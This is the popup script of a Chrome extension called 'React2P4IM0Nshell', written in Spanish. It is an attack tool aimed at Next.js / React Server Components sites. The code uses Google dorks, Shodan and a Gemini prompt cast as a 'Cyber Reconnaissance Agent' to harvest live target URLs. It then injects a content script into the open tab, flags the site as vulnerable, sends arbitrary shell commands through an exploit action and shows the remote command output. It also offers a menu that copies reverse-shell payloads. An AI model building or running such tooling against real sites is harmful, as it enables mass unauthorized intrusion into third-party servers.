// React2P4IM0Nshell - Controlador de Interfaz de Usuario (UI) v3.5
// Autor: P4IM0N
// FIX: Payloads de Reverse Shell y Detalles Visuales Tácticos.

document.addEventListener('DOMContentLoaded', () => {
    // Referencias a elementos del DOM
    const ui = {
        insigniaPasiva: document.getElementById('insignia-pasiva'),
        listaPasiva: document.getElementById('lista-pasiva'),
        btnHuella: document.getElementById('btnHuella'),
        resultadoHuella: document.getElementById('resultado-huella'),
        listaActiva: document.getElementById('lista-activa'),
        btnExploit: document.getElementById('btnExploit'),
        entradaComando: document.getElementById('entradaComando'),
        estadoExploit: document.getElementById('estado-exploit'),
        resultadoExploit: document.getElementById('resultado-exploit'),
        salidaRce: document.getElementById('salida-rce'),
        selectorExploit: document.getElementById('selectorExploit'),
        
        // Elementos Recon
        tabs: document.querySelectorAll('.nav-tab'),
        vistas: document.querySelectorAll('.vista-panel'),
        geminiToken: document.getElementById('geminiToken'),
        btnCazar: document.getElementById('btnCazar'),
        btnShodan: document.getElementById('btnShodan'),
        selectorDork: document.getElementById('selectorDork'),
        listaIps: document.getElementById('lista-ips'),

        // Elementos Terminal y Payload
        btnAbrirTerminal: document.getElementById('btnAbrirTerminal'),
        btnCerrarTerminal: document.getElementById('btnCerrarTerminal'),
        placeholderTerminal: document.getElementById('placeholder-terminal'),
        btnPayloads: document.getElementById('btnPayloads'),
        menuPayloads: document.getElementById('menuPayloads'),
        itemsPayload: document.querySelectorAll('.payload-item')
    };

    ui.estadoExploit.style.display = 'none';

    // --- LOGICA DE TERMINAL (SLIDE LEFT) ---
    let terminalCargada = false;

    if(ui.btnAbrirTerminal) {
        ui.btnAbrirTerminal.addEventListener('click', () => {
            // Expande el body a lo ancho
            document.body.classList.add('modo-terminal');
            
            // Carga el iframe solo la primera vez para ahorrar recursos
            if (!terminalCargada) {
                const cacheBuster = new Date().getTime();
                ui.placeholderTerminal.innerHTML = `
                    <iframe 
                        src="https://bellard.org/jslinux/vm.html?cpu=x86&url=https://bellard.org/jslinux/alpine-x86.cfg&mem=192&t=${cacheBuster}" 
                        class="terminal-iframe" 
                        allow="fullscreen; clipboard-read; clipboard-write" 
                        sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-modals">
                    </iframe>`;
                terminalCargada = true;
            }
        });
    }

    if(ui.btnCerrarTerminal) {
        ui.btnCerrarTerminal.addEventListener('click', () => {
            document.body.classList.remove('modo-terminal');
        });
    }

    // --- LOGICA DE PAYLOADS RSHELL ---
    if(ui.btnPayloads) {
        // Toggle Menu
        ui.btnPayloads.addEventListener('click', (e) => {
            e.stopPropagation(); // Evitar cierre inmediato
            const estaVisible = ui.menuPayloads.style.display === 'block';
            ui.menuPayloads.style.display = estaVisible ? 'none' : 'block';
        });

        // Copiar al portapapeles
        ui.itemsPayload.forEach(item => {
            item.addEventListener('click', () => {
                const codigo = item.getAttribute('data-code');
                navigator.clipboard.writeText(codigo).then(() => {
                    // Feedback Visual
                    const originalText = item.innerText;
                    item.innerText = "COPIADO AL PORTAPAPELES!";
                    item.style.color = "#00ff41";
                    
                    setTimeout(() => {
                        item.innerText = originalText;
                        item.style.color = "";
                        ui.menuPayloads.style.display = 'none';
                    }, 1000);
                });
            });
        });

        // Cerrar menú al hacer click fuera
        document.addEventListener('click', (e) => {
            if (!ui.menuPayloads.contains(e.target) && e.target !== ui.btnPayloads) {
                ui.menuPayloads.style.display = 'none';
            }
        });
    }

    // --- RESTO DE LÓGICA ORIGINAL (Invariable) ---

    // Mapa de Dorks
    const dorkMap = {
        'http.component:"Next.js" + 200': 'intitle:"Next.js" OR inurl:"/_next/static/" -site:github.com -site:stackoverflow.com -site:npm.im',
        'http.title:"Next.js" + country:"US"': 'site:.us (intitle:"Create Next App" OR intext:"Powered by Next.js")',
        'http.html:"_next/static" + 200': 'inurl:"/_next/static/chunks/pages" -site:github.com',
        'product:"Next.js"': '"Powered by Next.js" -site:vercel.com -site:github.com'
    };

    // Pestañas
    ui.tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            ui.tabs.forEach(t => t.classList.remove('activo'));
            ui.vistas.forEach(v => v.style.display = 'none');
            tab.classList.add('activo');
            document.getElementById(tab.getAttribute('data-target')).style.display = 'block';
        });
    });

    // Cargar Token
    const savedGemini = localStorage.getItem('p4im0n_gemini_token');
    if(savedGemini) ui.geminiToken.value = savedGemini;

    // Botón Shodan
    if(ui.btnShodan) {
        ui.btnShodan.addEventListener('click', () => {
            chrome.tabs.create({ url: 'https://www.shodan.io/search?query=http.component%3A%22Next.js%22+%2B+200' });
        });
    }

    // Helper JSON
    async function safeFetchJson(response, apiName) {
        const text = await response.text();
        try {
            const json = JSON.parse(text);
            if (!response.ok) throw new Error(json.error?.message || `HTTP ${response.status}`);
            return json;
        } catch (e) {
            throw new Error(`${apiName} Error: ${e.message}`);
        }
    }

    // Caza Google Neural
    ui.btnCazar.addEventListener('click', async () => {
        const geminiKey = ui.geminiToken.value.trim();
        const selectedKey = ui.selectorDork.value;
        const googleDork = dorkMap[selectedKey] || 'inurl:"/_next/static/"';

        if(!geminiKey) {
            ui.listaIps.innerHTML = "<div style='color:red'>ERROR: SE REQUIERE GEMINI TOKEN</div>";
            return;
        }

        localStorage.setItem('p4im0n_gemini_token', geminiKey);
        
        ui.btnCazar.disabled = true;
        ui.btnCazar.innerText = "GOOGLE NEURAL: CAZANDO...";
        ui.listaIps.innerHTML = `<div class='mensaje-espera'>EJECUTANDO DORK: ${googleDork}<br>ESCANEANDO ÍNDICE GLOBAL...</div>`;

        try {
            const prompt = `
            ROLE: Cyber Reconnaissance Agent.
            MISSION: Execute a Google Search for: '${googleDork}'.
            OBJECTIVE: Extract exactly 10 distinct, live URLs of web applications found in the search results.
            
            CONSTRAINTS:
            1. Ignore code repositories (GitHub, GitLab) and forums (StackOverflow).
            2. Focus on live deployments (.com, .io, .app, .net).
            3. RETURN ONLY RAW JSON.
            
            OUTPUT FORMAT (JSON Array):
            [
              {"url": "https://found-target.com", "org": "Site Title or Domain", "risk_score": "HIGH"}
            ]
            `;

            const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${geminiKey}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [{ parts: [{ text: prompt }] }],
                    tools: [{ google_search: {} }] 
                })
            });

            const data = await safeFetchJson(response, "GEMINI");
            
            const rawText = data.candidates?.[0]?.content?.parts?.[0]?.text;
            if (!rawText) throw new Error("La IA no devolvió datos legibles.");

            const jsonMatch = rawText.match(/\[[\s\S]*\]/);
            if (!jsonMatch) throw new Error("No se encontraron objetivos estructurados en la respuesta.");

            const targets = JSON.parse(jsonMatch[0]);

            ui.listaIps.innerHTML = "";
            
            if (targets.length === 0) {
                 ui.listaIps.innerHTML = "<div class='mensaje-espera'>La búsqueda no arrojó resultados limpios. Intenta otro filtro.</div>";
            } else {
                targets.forEach(t => {
                    const div = document.createElement('div');
                    div.className = 'item-ip';
                    const cleanUrl = t.url.replace(/^https?:\/\//, '').replace(/\/$/, '');
                    const displayUrl = cleanUrl.length > 30 ? cleanUrl.substring(0, 27) + '...' : cleanUrl;
                    
                    div.innerHTML = `
                        <span><span class="ip-addr">${displayUrl}</span> <span style="color:#666">(${t.org.substring(0,15)})</span></span>
                        <span class="ip-risk">[${t.risk_score}]</span>
                    `;
                    div.style.cursor = "pointer";
                    div.title = "Click para copiar: " + t.url;
                    div.addEventListener('click', () => {
                        navigator.clipboard.writeText(t.url);
                        div.style.background = "#003b00";
                        setTimeout(() => div.style.background = "", 200);
                    });
                    ui.listaIps.appendChild(div);
                });
            }

        } catch (e) {
            console.error(e);
            ui.listaIps.innerHTML = `<div style='color:#ff003c; font-size:10px; padding:5px;'>FALLO DE MISIÓN:<br>${e.message}<br><br>Tip: Verifica tu conexión o intenta otro Dork.</div>`;
        } finally {
            ui.btnCazar.disabled = false;
            ui.btnCazar.innerText = "EJECUTAR GOOGLE DORKING";
        }
    });

    // --- LÓGICA CMD CENTER (Invariable) ---
    function iniciarConexion(idPestana, intento = 0) {
        chrome.tabs.sendMessage(idPestana, {accion: "obtener_pasivo"}, (respuesta) => {
            if (chrome.runtime.lastError || !respuesta) {
                if (intento === 0) {
                    ui.insigniaPasiva.innerText = "INYECTANDO...";
                    chrome.scripting.executeScript({
                        target: { tabId: idPestana },
                        files: ['content.js']
                    }, () => {
                        if (!chrome.runtime.lastError) setTimeout(() => iniciarConexion(idPestana, 1), 200);
                    });
                    return;
                }
                ui.insigniaPasiva.innerText = "OFFLINE";
                ui.insigniaPasiva.className = "insignia-estado";
                return;
            }
            procesarDatosPasivos(respuesta);
        });
    }

    function procesarDatosPasivos(respuesta) {
        if(respuesta.esRSC) {
            ui.insigniaPasiva.innerText = "VULNERABLE";
            ui.insigniaPasiva.className = "insignia-estado detectado";
        } else {
            ui.insigniaPasiva.innerText = "SEGURO";
            ui.insigniaPasiva.className = "insignia-estado";
        }
        ui.listaPasiva.innerHTML = "";
        if(respuesta.detalles.length === 0) ui.listaPasiva.innerHTML = "<li>No se encontraron firmas estándar.</li>";
        respuesta.detalles.forEach(d => {
            const li = document.createElement('li');
            li.innerText = d;
            li.style.color = "#ff003c";
            ui.listaPasiva.appendChild(li);
        });
    }

    chrome.tabs.query({active: true, currentWindow: true}, (pestanas) => {
        if (!pestanas || pestanas.length === 0) return;
        const idPestana = pestanas[0].id;
        iniciarConexion(idPestana);

        ui.btnHuella.addEventListener('click', () => {
            ui.btnHuella.disabled = true;
            ui.btnHuella.innerText = "EJECUTANDO HANDSHAKE...";
            ui.resultadoHuella.style.display = 'none';

            chrome.tabs.sendMessage(idPestana, {accion: "ejecutar_huella"}, (respuesta) => {
                ui.btnHuella.disabled = false;
                ui.btnHuella.innerText = "RE-INICIAR HANDSHAKE";
                ui.resultadoHuella.style.display = 'block';
                ui.listaActiva.innerHTML = "";

                if(respuesta && respuesta.detectado) {
                    respuesta.detalles.forEach(d => {
                        const li = document.createElement('li');
                        li.innerText = d;
                        li.style.color = "#d35400";
                        ui.listaActiva.appendChild(li);
                    });
                } else {
                    ui.listaActiva.innerHTML = "<li style='color:#00ff41'>El objetivo no respondió a la sonda RSC.</li>";
                }
            });
        });

        ui.btnExploit.addEventListener('click', () => {
            const cmd = ui.entradaComando.value || "whoami";
            const type = ui.selectorExploit.value;

            ui.btnExploit.disabled = true;
            ui.estadoExploit.style.display = 'block';
            ui.resultadoExploit.style.display = 'none';
            ui.salidaRce.style.color = "#00ff41";

            chrome.tabs.sendMessage(idPestana, {
                accion: "ejecutar_exploit", 
                tipo: type,
                cmd: cmd
            }, (respuesta) => {
                ui.btnExploit.disabled = false;
                ui.estadoExploit.style.display = 'none';
                ui.resultadoExploit.style.display = 'block';

                if(respuesta && respuesta.exito) {
                    ui.salidaRce.style.color = "#00cec9"; 
                    ui.salidaRce.innerText = `[P4IM0N@SHELL]:~$ ${cmd}\n\n${respuesta.salida}`;
                    chrome.runtime.sendMessage({ accion: "actualizar_insignia" });
                } else {
                    ui.salidaRce.style.color = "#ff003c"; 
                    ui.salidaRce.innerText = `[ERROR] FALLO DEL EXPLOIT\nRazón: ${respuesta ? respuesta.msg : "Desconocida"}`;
                }
            });
        });
    });
});